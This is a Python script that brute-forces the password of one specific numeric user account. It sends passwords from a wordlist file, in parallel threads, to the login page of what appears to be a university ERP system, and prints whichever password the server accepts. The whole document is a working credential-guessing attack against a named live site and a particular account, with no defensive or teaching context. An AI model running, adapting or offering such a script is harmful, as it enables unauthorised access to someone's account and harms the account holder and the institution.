import concurrent.futures
import requests
import time
import sys

url = 'https://erp.gctu.edu.gh/sip/auth/login.php'
username = 4231220076
start = time.perf_counter()

def brute(passwd):
    password_found = False

    data ={
        "username":username,
        "password":passwd
    }

    r = requests.post(url, data=data)
    if r.text == 'ok':
        return f"correct password {passwd}"
    pass


with open("pass.txt") as f:   
    with concurrent.futures.ThreadPoolExecutor() as executor:
        pass_list = f.readlines()
        results = executor.map(brute, pass_list)
        for result in results:
            print(result)
        


finish = time.perf_counter()

print("finish in %s second(s)"%(finish - start))